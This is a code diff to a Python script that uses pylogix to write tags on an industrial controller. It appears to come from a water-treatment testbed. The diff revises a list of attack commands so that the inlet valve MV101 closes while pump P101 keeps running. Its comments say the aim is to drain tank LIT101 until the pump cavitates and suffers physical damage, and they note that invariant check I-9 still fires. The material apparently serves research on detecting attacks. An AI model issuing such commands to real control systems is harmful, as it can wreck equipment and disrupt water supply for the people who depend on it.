@@ -24,9 +24,12 @@ from pylogix import PLC
 # Attack commands — two-step pattern: disable auto, issue command
 ATTACK_CMDS = [
     ('HMI_MV101.Auto', False),   # take MV101 out of auto mode
-    ('HMI_MV101.Cmd',  1),       # 1=CLOSE inlet valve
-    ('HMI_P101.Auto',  False),   # take P101 out of auto mode
-    ('HMI_P101.Cmd',   1),       # 1=OFF stop pump
+    ('HMI_MV101.Cmd',  1),       # 1=CLOSE inlet valve — stop inflow
+    # P101 left ON (auto mode unchanged) — pump keeps running
+    # This actively drains the tank: LIT101 drops ~1.8mm/s toward LL (250mm)
+    # → pump cavitation → physical damage
+    # I-9 still fires: MV101=CLOSED AND P101.Auto=True AND LIT101 in normal range
+    #   → inlet closed but pump running = tank draining with no refill
 ]
 
 # Safe state to restore on exit
